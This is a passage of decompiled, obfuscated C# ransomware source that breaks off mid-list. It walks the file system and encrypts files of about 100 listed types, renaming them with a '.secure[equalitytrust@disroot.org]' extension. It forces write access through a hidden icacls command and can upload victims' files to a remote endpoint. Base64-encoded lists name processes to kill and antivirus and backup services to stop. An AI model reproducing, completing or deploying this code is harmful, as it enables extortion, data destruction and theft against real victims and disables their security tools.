using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using DSxuBcQHKsGd;
using Microsoft.Win32;
using wRmhQIEMmvARz;

namespace nLpTFjJRwUBp;

internal class RLgUMHIwwGSuCLo
{
	public class JhqhtdioqUce
	{
		private static StringCollection gsJexQZTYndiAF = new StringCollection();

		private static List<string> gOvdFKeCvtcjU = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(CZuAqRlrrEeJTK("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("RESTORE_FILES_INFO") && !text.EndsWith(".secure[equalitytrust@disroot.org]") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(ySfDrgDsIwD))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(hmKFRHKVooxEuV) * 1024.0 * 1024.0 && wRSpBcdZogMO == "YES")
							{
								gOvdFKeCvtcjU.Add(text);
							}
							else if (File.Exists(text) && wRSpBcdZogMO == "NO")
							{
								gOvdFKeCvtcjU.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				string[] array4 = array2;
				foreach (string root2 in array4)
				{
					WalkDirectoryTree(root2);
				}
			}
			return gOvdFKeCvtcjU;
		}
	}

	[CompilerGenerated]
	private sealed class bgdMSKLHrHKvp
	{
		public string NiznuEFneatR;

		public bool _003CMain_003Eb__6(Process p)
		{
			return p.ProcessName == NiznuEFneatR;
		}
	}

	[CompilerGenerated]
	private sealed class LoHMuWEtUCCIx
	{
		public string[] PIAooWtkmxiwK;

		public void _003CMain_003Eb__7()
		{
			LsKTTEFrgVj.aEQWhdctdSXcLg(PIAooWtkmxiwK);
		}
	}

	[CompilerGenerated]
	private sealed class PaOmPoqmdUtEY
	{
		public string vmLGgWMlrsoYb;

		public void _003CEncodeOnTheWay_003Eb__1c()
		{
			HbVPzLeHIOQ(vmLGgWMlrsoYb, new string[100]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert",
				"docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov",
				"xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora",
				"mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z"
			}, ".secure[equalitytrust@disroot.org]", new string[0], SCfJDJJeFRzoLD);
		}
	}

	[CompilerGenerated]
	private sealed class lDEkrOGuLghiJqVzz
	{
		private sealed class tFmEFIalzzVkFU
		{
			public lDEkrOGuLghiJqVzz MiIeYIscjU;

			public string ZEQcEVvnuPdHSC;

			public void _003CCrypt_003Eb__23()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					PvaQVsyFJwlr(WindowsIdentity.GetCurrent().Name, ZEQcEVvnuPdHSC);
				}
			}

			public void _003CCrypt_003Eb__24()
			{
				gEpzfLgRuKpTSZi(ZEQcEVvnuPdHSC, MiIeYIscjU.tPFSVWSFFkmDqjR, MiIeYIscjU.CzZIEejfwaGrJ, MiIeYIscjU.hQluwOVgIHU, MiIeYIscjU.XYAyoFNUnpulciRS);
			}
		}

		public string[] tPFSVWSFFkmDqjR;

		public string[] hQluwOVgIHU;

		public string XYAyoFNUnpulciRS;

		public string CzZIEejfwaGrJ;

		public void _003CCrypt_003Eb__22(string t)
		{
			if (eEVwLQEuFPc && !jIauvqjdBhUVg().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						PvaQVsyFJwlr(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (UhhaeZclnYxkU == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					gEpzfLgRuKpTSZi(t, tPFSVWSFFkmDqjR, CzZIEejfwaGrJ, hQluwOVgIHU, XYAyoFNUnpulciRS);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				gEpzfLgRuKpTSZi(t, tPFSVWSFFkmDqjR, CzZIEejfwaGrJ, hQluwOVgIHU, XYAyoFNUnpulciRS);
			}
		}
	}

	[CompilerGenerated]
	private sealed class WQCbKdwJVFf
	{
		private sealed class qsYLegOiVRE
		{
			public WQCbKdwJVFf VPzItkOjoR;

			public string dfCgBqQlTBY;

			public void _003CWorkerCrypter2_003Eb__30()
			{
				foreach (string item in LWncuBZUPCH)
				{
					if (dfCgBqQlTBY.ToLower().EndsWith(item + VPzItkOjoR.bMOeZDxZvYRf) && CUgGjDJJsuh == "YES")
					{
						if (Convert.ToInt32(UusgggfFEiH) * 1024 * 1024 > new FileInfo(dfCgBqQlTBY).Length)
						{
							try
							{
								HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", dfCgBqQlTBY);
							}
							catch
							{
							}
						}
					}
					else if (dfCgBqQlTBY.ToLower().EndsWith(item) && CUgGjDJJsuh == "NO")
					{
						try
						{
							HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", dfCgBqQlTBY);
						}
						catch
						{
						}
					}
				}
			}
		}

		private sealed class CWKZZQzJlKRo
		{
			public WQCbKdwJVFf VPzItkOjoR;

			public string gKqbOyCWVvAM;

			public void _003CWorkerCrypter2_003Eb__32()
			{
				foreach (string item in LWncuBZUPCH)
				{
					if (gKqbOyCWVvAM.ToLower().EndsWith(item + VPzItkOjoR.bMOeZDxZvYRf) && CUgGjDJJsuh == "YES")
					{
						if (Convert.ToInt32(UusgggfFEiH) * 1024 * 1024 > new FileInfo(gKqbOyCWVvAM).Length)
						{
							try
							{
								HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", gKqbOyCWVvAM);
							}
							catch
							{
							}
						}
					}
					else if (gKqbOyCWVvAM.ToLower().EndsWith(item) && CUgGjDJJsuh == "NO")
					{
						try
						{
							HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", gKqbOyCWVvAM);
						}
						catch
						{
						}
					}
				}
			}
		}

		public List<string> DaEJCOGJeLp;

		public List<string> VpKDCdGkRHf;

		public string bMOeZDxZvYRf;

		public string[] ShzIoUQkUd;

		public string SCfJDJJeFRzoLD;

		public void _003CWorkerCrypter2_003Eb__2f(string t1)
		{
			string dfCgBqQlTBY;
			foreach (string item in VpKDCdGkRHf)
			{
				if (ShzIoUQkUd.Length != 0)
				{
					string[] shzIoUQkUd = ShzIoUQkUd;
					int num = 0;
					while (num < shzIoUQkUd.Length)
					{
						string value = shzIoUQkUd[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_07dd;
					}
				}
				try
				{
					if (item.EndsWith(bMOeZDxZvYRf))
					{
						goto IL_07dd;
					}
				}
				catch (Exception)
				{
					goto IL_07dd;
				}
				if (!item.EndsWith(t1) || ShmRLOSlbOEEzcZ.Contains(item))
				{
					continue;
				}
				if (KHFqRGVrKXYwzu == "YES")
				{
					try
					{
						if (WZhpvictZiGEM.ZHMKrLAFScGR(item))
						{
							WZhpvictZiGEM.xXyRUeNTcwhWhzK(item);
						}
					}
					catch
					{
					}
				}
				ShmRLOSlbOEEzcZ.Add(item);
				if (!PaviRzoDrHSF.Contains(Path.GetDirectoryName(item)))
				{
					PaviRzoDrHSF.Add(Path.GetDirectoryName(item));
				}
				TIDacAxcfWvb(item);
				try
				{
					new sUtmdNLRyLBV().gsCnkMATdlEVHOMh(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (nSLCvWTPGScIDK)
							{
								Console.WriteLine("Setting write access permission: " + item + " - File Size: " + new FileInfo(item).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
						}
						catch
						{
						}
						oapSGNsteEjKT(CZuAqRlrrEeJTK("aWNhY2xzLmV4ZQ=="), "\"" + item + "\"" + CZuAqRlrrEeJTK("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + CZuAqRlrrEeJTK("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
				{
					if (QWMTAZEOVrAU)
					{
						try
						{
							File.AppendAllText(kOKakAljNFiEE, "File: " + item + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (QWMTAZEOVrAU)
						{
							try
							{
								File.AppendAllText(kOKakAljNFiEE, "File: " + item + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						NksflcjUNFsBl++;
						goto end_IL_0237;
					}
					if (IGzafCiUvTKnTs == "YES" && new FileInfo(item).Length > Convert.ToInt32(YROKpHBeSOV) * 1024 * 1024 && !DaEJCOGJeLp.Contains(t1))
					{
						try
						{
							if (bMOeZDxZvYRf != ".*")
							{
								if (tQdFbIlBsTQIR)
								{
									bMOeZDxZvYRf = AWOVMwfUoZKZmvd + bMOeZDxZvYRf;
								}
								File.Move(item, item + bMOeZDxZvYRf);
							}
						}
						catch (Exception ex6)
						{
							if (QWMTAZEOVrAU)
							{
								try
								{
									File.AppendAllText(kOKakAljNFiEE, "File: " + item + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							NksflcjUNFsBl++;
							goto end_IL_0237;
						}
						dfCgBqQlTBY = "";
						if (bMOeZDxZvYRf != ".*")
						{
							dfCgBqQlTBY = item + bMOeZDxZvYRf;
						}
						else
						{
							dfCgBqQlTBY = item;
						}
						if (prkXlzmtQDXa == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in LWncuBZUPCH)
								{
									if (dfCgBqQlTBY.ToLower().EndsWith(item2 + bMOeZDxZvYRf) && CUgGjDJJsuh == "YES")
									{
										if (Convert.ToInt32(UusgggfFEiH) * 1024 * 1024 > new FileInfo(dfCgBqQlTBY).Length)
										{
											try
											{
												HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", dfCgBqQlTBY);
											}
											catch
											{
											}
										}
									}
									else if (dfCgBqQlTBY.ToLower().EndsWith(item2) && CUgGjDJJsuh == "NO")
									{
										try
										{
											HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", dfCgBqQlTBY);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = WlyMRVszoI.zYSkEclrNaZ(32);
						string s = ddeFRRDtEqs.wfmtJmcBJJaY(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] array2 = mfItpThRjVteK.fihHPRoCTnieNGb(dfCgBqQlTBY, Convert.ToInt32(YROKpHBeSOV) * 1024 * 1024);
						if (!mfItpThRjVteK.ZhJOAFGjrk(wSHuoUgoZPPZA: (!JeyEmTDKUFo) ? (sTRoWRHIVycKW ? mfItpThRjVteK.ZzukpnbfIFX(array2, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : mfItpThRjVteK.ZzukpnbfIFX(array2, Encoding.ASCII.GetBytes(SCfJDJJeFRzoLD), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (sTRoWRHIVycKW ? fCAALXQgidNAFTY.RvZPYPusPqBFZy(array2, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fCAALXQgidNAFTY.RvZPYPusPqBFZy(array2, Encoding.ASCII.GetBytes(SCfJDJJeFRzoLD), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), JAYdEktfsDX: dfCgBqQlTBY, KTdbjFMhpnp: bytes))
						{
							try
							{
								File.Move(item + bMOeZDxZvYRf, item);
							}
							catch (Exception)
							{
							}
							continue;
						}
						goto IL_07dd;
					}
					if (tQdFbIlBsTQIR)
					{
						bMOeZDxZvYRf = AWOVMwfUoZKZmvd + bMOeZDxZvYRf;
					}
					string text2 = WlyMRVszoI.zYSkEclrNaZ(32);
					string s2 = ddeFRRDtEqs.wfmtJmcBJJaY(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (bMOeZDxZvYRf != ".*")
					{
						if (!qlEzvrxXFN)
						{
							if (!sTRoWRHIVycKW)
							{
								nMyHCDrvezEPVkp(item, item + bMOeZDxZvYRf, IyxuTzyTKqYlHzna);
							}
							else
							{
								nMyHCDrvezEPVkp(item, item + bMOeZDxZvYRf, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!sTRoWRHIVycKW)
								{
									wRzXnziDJBJgwL(item, item + bMOeZDxZvYRf, IyxuTzyTKqYlHzna);
								}
								else
								{
									wRzXnziDJBJgwL(item, item + bMOeZDxZvYRf, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex9)
							{
								if (QWMTAZEOVrAU)
								{
									try
									{
										File.AppendAllText(kOKakAljNFiEE, "File: " + item + " - Error while fully writing to file: " + ex9.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								NksflcjUNFsBl++;
								try
								{
									File.Move(item + bMOeZDxZvYRf, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_0237;
							}
						}
					}
					else if (!qlEzvrxXFN)
					{
						if (!sTRoWRHIVycKW)
						{
							nMyHCDrvezEPVkp(item, item + ".part", IyxuTzyTKqYlHzna);
						}
						else
						{
							nMyHCDrvezEPVkp(item, item + ".part", Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!sTRoWRHIVycKW)
							{
								wRzXnziDJBJgwL(item, item, IyxuTzyTKqYlHzna);
							}
							else
							{
								wRzXnziDJBJgwL(item, item, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex12)
						{
							if (QWMTAZEOVrAU)
							{
								try
								{
									File.AppendAllText(kOKakAljNFiEE, "File: " + item + " - Error while fully writing to file: " + ex12.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							NksflcjUNFsBl++;
							goto end_IL_0237;
						}
					}
					if (sTRoWRHIVycKW)
					{
						if (bMOeZDxZvYRf != ".*")
						{
							ulcCGCvziBPMSJ(item + bMOeZDxZvYRf, bytes2);
						}
						else
						{
							ulcCGCvziBPMSJ(item, bytes2);
						}
					}
					goto IL_07dd;
					end_IL_0237:;
				}
				catch (Exception)
				{
					goto IL_07dd;
				}
				continue;
				IL_07dd:
				VpKDCdGkRHf.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__31(string fileInfo)
		{
			if (ShzIoUQkUd.Length != 0)
			{
				string[] shzIoUQkUd = ShzIoUQkUd;
				int num = 0;
				while (num < shzIoUQkUd.Length)
				{
					string value = shzIoUQkUd[num];
					if (!fileInfo.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_08a9;
				}
			}
			try
			{
				if (fileInfo.EndsWith(bMOeZDxZvYRf))
				{
					goto IL_08a9;
				}
			}
			catch (Exception)
			{
				goto IL_08a9;
			}
			if (!ShmRLOSlbOEEzcZ.Contains(fileInfo))
			{
				if (KHFqRGVrKXYwzu == "YES")
				{
					try
					{
						if (WZhpvictZiGEM.ZHMKrLAFScGR(fileInfo))
						{
							WZhpvictZiGEM.xXyRUeNTcwhWhzK(fileInfo);
						}
					}
					catch
					{
					}
				}
				ShmRLOSlbOEEzcZ.Add(fileInfo);
				if (!PaviRzoDrHSF.Contains(Path.GetDirectoryName(fileInfo)))
				{
					PaviRzoDrHSF.Add(Path.GetDirectoryName(fileInfo));
				}
				TIDacAxcfWvb(fileInfo);
				try
				{
					new sUtmdNLRyLBV().gsCnkMATdlEVHOMh(fileInfo);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(fileInfo, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (nSLCvWTPGScIDK)
							{
								Console.WriteLine("Setting write access permission: " + fileInfo + " - File Size: " + new FileInfo(fileInfo).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
						}
						catch
						{
						}
						oapSGNsteEjKT(CZuAqRlrrEeJTK("aWNhY2xzLmV4ZQ=="), "\"" + fileInfo + "\"" + CZuAqRlrrEeJTK("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + CZuAqRlrrEeJTK("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
				{
					if (QWMTAZEOVrAU)
					{
						try
						{
							File.AppendAllText(kOKakAljNFiEE, "File: " + fileInfo + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(fileInfo).Length != 0L)
						{
							goto end_IL_0284;
						}
						goto end_IL_0284_2;
						end_IL_0284:;
					}
					catch (Exception ex4)
					{
						if (QWMTAZEOVrAU)
						{
							try
							{
								File.AppendAllText(kOKakAljNFiEE, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						NksflcjUNFsBl++;
						goto end_IL_0284_2;
					}
					if (IGzafCiUvTKnTs == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(YROKpHBeSOV) * 1024 * 1024)
					{
						try
						{
							if (bMOeZDxZvYRf != ".*")
							{
								if (tQdFbIlBsTQIR)
								{
									bMOeZDxZvYRf = AWOVMwfUoZKZmvd + bMOeZDxZvYRf;
								}
								File.Move(fileInfo, fileInfo + bMOeZDxZvYRf);
							}
						}
						catch (Exception ex6)
						{
							if (QWMTAZEOVrAU)
							{
								try
								{
									File.AppendAllText(kOKakAljNFiEE, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							NksflcjUNFsBl++;
							return;
						}
						if (bMOeZDxZvYRf != ".*")
						{
							fileInfo += bMOeZDxZvYRf;
						}
						if (prkXlzmtQDXa == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in LWncuBZUPCH)
								{
									if (fileInfo.ToLower().EndsWith(item + bMOeZDxZvYRf) && CUgGjDJJsuh == "YES")
									{
										if (Convert.ToInt32(UusgggfFEiH) * 1024 * 1024 > new FileInfo(fileInfo).Length)
										{
											try
											{
												HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
									else if (fileInfo.ToLower().EndsWith(item) && CUgGjDJJsuh == "NO")
									{
										try
										{
											HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", fileInfo);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = WlyMRVszoI.zYSkEclrNaZ(32);
						string s = ddeFRRDtEqs.wfmtJmcBJJaY(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] array2 = mfItpThRjVteK.fihHPRoCTnieNGb(fileInfo, Convert.ToInt32(YROKpHBeSOV) * 1024 * 1024);
						if (!mfItpThRjVteK.ZhJOAFGjrk(wSHuoUgoZPPZA: (!JeyEmTDKUFo) ? (sTRoWRHIVycKW ? mfItpThRjVteK.ZzukpnbfIFX(array2, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : mfItpThRjVteK.ZzukpnbfIFX(array2, Encoding.ASCII.GetBytes(SCfJDJJeFRzoLD), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (sTRoWRHIVycKW ? fCAALXQgidNAFTY.RvZPYPusPqBFZy(array2, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fCAALXQgidNAFTY.RvZPYPusPqBFZy(array2, Encoding.ASCII.GetBytes(SCfJDJJeFRzoLD), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), JAYdEktfsDX: fileInfo, KTdbjFMhpnp: bytes))
						{
							try
							{
								File.Move(fileInfo + bMOeZDxZvYRf, fileInfo);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (tQdFbIlBsTQIR)
						{
							bMOeZDxZvYRf = AWOVMwfUoZKZmvd + bMOeZDxZvYRf;
						}
						string text2 = WlyMRVszoI.zYSkEclrNaZ(32);
						string s2 = ddeFRRDtEqs.wfmtJmcBJJaY(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (bMOeZDxZvYRf != ".*")
						{
							if (!qlEzvrxXFN)
							{
								if (!sTRoWRHIVycKW)
								{
									nMyHCDrvezEPVkp(fileInfo, fileInfo + bMOeZDxZvYRf, IyxuTzyTKqYlHzna);
								}
								else
								{
									nMyHCDrvezEPVkp(fileInfo, fileInfo + bMOeZDxZvYRf, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!sTRoWRHIVycKW)
									{
										wRzXnziDJBJgwL(fileInfo, fileInfo + bMOeZDxZvYRf, IyxuTzyTKqYlHzna);
									}
									else
									{
										wRzXnziDJBJgwL(fileInfo, fileInfo + bMOeZDxZvYRf, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex9)
								{
									if (QWMTAZEOVrAU)
									{
										try
										{
											File.AppendAllText(kOKakAljNFiEE, "File: " + fileInfo + " - Error while fully writing to file: " + ex9.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									NksflcjUNFsBl++;
									try
									{
										File.Move(fileInfo + bMOeZDxZvYRf, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!qlEzvrxXFN)
						{
							if (!sTRoWRHIVycKW)
							{
								nMyHCDrvezEPVkp(fileInfo, fileInfo + ".part", IyxuTzyTKqYlHzna);
							}
							else
							{
								nMyHCDrvezEPVkp(fileInfo, fileInfo + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!sTRoWRHIVycKW)
								{
									wRzXnziDJBJgwL(fileInfo, fileInfo, IyxuTzyTKqYlHzna);
								}
								else
								{
									wRzXnziDJBJgwL(fileInfo, fileInfo, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex12)
							{
								if (QWMTAZEOVrAU)
								{
									try
									{
										File.AppendAllText(kOKakAljNFiEE, "File: " + fileInfo + " - Error while fully writing to file: " + ex12.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								NksflcjUNFsBl++;
								return;
							}
						}
						if (sTRoWRHIVycKW)
						{
							if (bMOeZDxZvYRf != ".*")
							{
								ulcCGCvziBPMSJ(fileInfo + bMOeZDxZvYRf, bytes2);
							}
							else
							{
								ulcCGCvziBPMSJ(fileInfo, bytes2);
							}
						}
					}
					end_IL_0284_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_08a9;
			IL_08a9:
			VpKDCdGkRHf.Remove(fileInfo);
		}
	}

	[CompilerGenerated]
	private sealed class HJPZlABazAOY
	{
		public string BRUFGgBDjwya;

		public string qoiZMMzLEvcyI;

		public void _003CEncrypt2_003Eb__3f()
		{
			while (true)
			{
				try
				{
					File.Delete(BRUFGgBDjwya);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__40()
		{
			while (true)
			{
				try
				{
					if (File.Exists(qoiZMMzLEvcyI))
					{
						File.Delete(qoiZMMzLEvcyI);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string HldgbYiGZUf = "EVET";

	public static string[] KMkdkAEYdEnsC;

	public static IEnumerable<DirectoryInfo> ILCEWAFpNRUdoG;

	public static byte[] IyxuTzyTKqYlHzna = null;

	public static DirectoryInfo WtIUGPsaLVNxFY;

	public static string wRSpBcdZogMO = "NO";

	public static string hmKFRHKVooxEuV = "100000000";

	public static List<string> mVucaeNrRtoSGRM = new List<string>();

	public static List<string> allKejHLrbdNOvhHeL = new List<string>();

	public static string TaIJZxciYkmOk = "NO";

	public static string SCfJDJJeFRzoLD = "";

	public static string exLsMhwhckIzmt = "";

	public static string tXhnleJCjdOMPu = "NO";

	public static int FwQzXAlWYon = 0;

	public static string KHFqRGVrKXYwzu = "NO";

	public static string NoRofXBFnfWVFgm = "NO";

	public static string lyiwJTVWcDLW = "NO";

	public static string qHCsjBWBsUFT = "0";

	public static string ZFbxNeOhRbHPncsqE = "NO";

	public static string kUwCbaWTzOqNK = "YES";

	public static string DiPXXFwhZrRPLt = "NO";

	public static string mwemKzzdAQz = "NO";

	public static List<string> FVxsyspmSC = new List<string>
	{
		CZuAqRlrrEeJTK("bHNhc3MuZXhl"),
		CZuAqRlrrEeJTK("c3ZjaHN0LmV4ZQ=="),
		CZuAqRlrrEeJTK("Y3Jjc3MuZXhl"),
		CZuAqRlrrEeJTK("Y2hyb21lMzIuZXhl"),
		CZuAqRlrrEeJTK("ZmlyZWZveC5leGU="),
		CZuAqRlrrEeJTK("Y2FsYy5leGU="),
		CZuAqRlrrEeJTK("bXlzcWxkLmV4ZQ=="),
		CZuAqRlrrEeJTK("ZGxsaHN0LmV4ZQ=="),
		CZuAqRlrrEeJTK("b3BlcmEzMi5leGU="),
		CZuAqRlrrEeJTK("bWVtb3AuZXhl"),
		CZuAqRlrrEeJTK("c3Bvb2xjdi5leGU="),
		CZuAqRlrrEeJTK("Y3RmbW9tLmV4ZQ=="),
		CZuAqRlrrEeJTK("U2t5cGVBcHAuZXhl")
	};

	public static List<string> PaviRzoDrHSF = new List<string>();

	public static string rsGnJViWWTq = "NO";

	public static string DOyeQIuTzhpzu = "NO";

	public static string pogxHaAOATiD = "NO";

	public static List<string> ShmRLOSlbOEEzcZ = new List<string>();

	public static string qlkWxQVtuOp = "NO";

	private static string xiRjNUcJUnW = "c995f0cc-d48e-4e7a-969f-43a634b87bfd";

	public static string UhhaeZclnYxkU = "NO";

	public static string wAEzaoAFSxKN = "NO";

	public static List<string> ClseyCiYOOeGDy = new List<string>
	{
		CZuAqRlrrEeJTK("c3RhcnQgRG5zY2FjaGUgL3k="),
		CZuAqRlrrEeJTK("c3RhcnQgRkRSZXNQdWIgL3k="),
		CZuAqRlrrEeJTK("c3RhcnQgU1NEUFNSViAveQ=="),
		CZuAqRlrrEeJTK("c3RhcnQgdXBucGhvc3QgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBhdnBzdXMgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBtZmV3YyAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		CZuAqRlrrEeJTK("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		CZuAqRlrrEeJTK("c3RvcCBEZWZXYXRjaCAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBjY0V2dE1nciAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBjY1NldE1nciAveQ=="),
		CZuAqRlrrEeJTK("c3RvcCBTYXZSb2FtIC95"),
